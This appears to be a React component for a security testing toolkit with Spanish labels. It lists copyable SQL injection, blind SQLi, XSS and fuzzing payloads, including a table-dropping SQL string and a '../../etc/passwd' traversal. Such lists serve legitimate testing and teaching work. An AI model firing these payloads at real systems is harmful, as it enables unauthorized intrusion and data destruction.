import { useState } from 'react'
import { Button } from '@/components/ui'

const PAYLOADS = {
  sqli:       ["' OR '1'='1", "' OR '1'='1'--", "1 UNION SELECT null--", "' AND 1=0 UNION SELECT null,null--", "admin'--", "1; DROP TABLE users--"],
  blind_sqli: ["1' AND SUBSTRING((SELECT database()),1,1)='a'--", "1' AND 1=1--", "1' AND 1=2--", "1' AND LENGTH(database())>1--"],
  xss:        ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>', 'javascript:alert(1)', '<svg onload=alert(1)>'],
  fuzzing:    ["'", '"', '<', '>', '&', ';', '|', '`', '../', '../../etc/passwd', '%00', 'null', 'undefined', '${7*7}'],
}

const LABELS = { sqli: 'SQL Injection', blind_sqli: 'Blind SQLi', xss: 'XSS', fuzzing: 'Fuzzing genérico' }

export function PayloadGenerator() {
  const [type, setType] = useState('sqli')
  const [copied, setCopied] = useState(null)

  const copyAll = () => {
    navigator.clipboard.writeText(PAYLOADS[type].join('\n'))
    setCopied('all')
    setTimeout(() => setCopied(null), 2000)
  }

  return (
    <div className="space-y-4">
      <div className="flex items-center gap-3">
        <select
          value={type}
          onChange={e => setType(e.target.value)}
          className="px-3 py-2 rounded border outline-none text-[10px] cursor-pointer"
          style={{
            fontFamily: 'var(--font-mono)',
            background: 'var(--hs-bg)',
            borderColor: 'var(--hs-border-hover)',
            color: 'var(--hs-text-secondary)',
          }}
        >
          {Object.entries(LABELS).map(([k, v]) => <option key={k} value={k}>{v}</option>)}
        </select>
        <Button size="sm" variant="secondary" onClick={copyAll}>
          {copied === 'all' ? '✓ copiado todo' : 'copiar todos'}
        </Button>
      </div>

      <div className="space-y-1.5">
        {PAYLOADS[type].map((payload, i) => (
          <div
            key={i}
            className="flex items-center gap-2 rounded border px-3 py-2"
            style={{ background: 'var(--hs-bg)', borderColor: 'var(--hs-border)' }}
          >
            <code
              className="flex-1 text-[11px]"
              style={{ fontFamily: 'var(--font-mono)', color: '#ef7a7a' }}
            >
              {payload}
            </code>
            <button
              onClick={() => { navigator.clipboard.writeText(payload); setCopied(i); setTimeout(() => setCopied(null), 1500) }}
              className="text-[10px] whitespace-nowrap"
              style={{ fontFamily: 'var(--font-mono)', color: '#6aafef' }}
            >
              {copied === i ? '✓' : 'copiar'}
            </button>
          </div>
        ))}
      </div>
    </div>
  )
}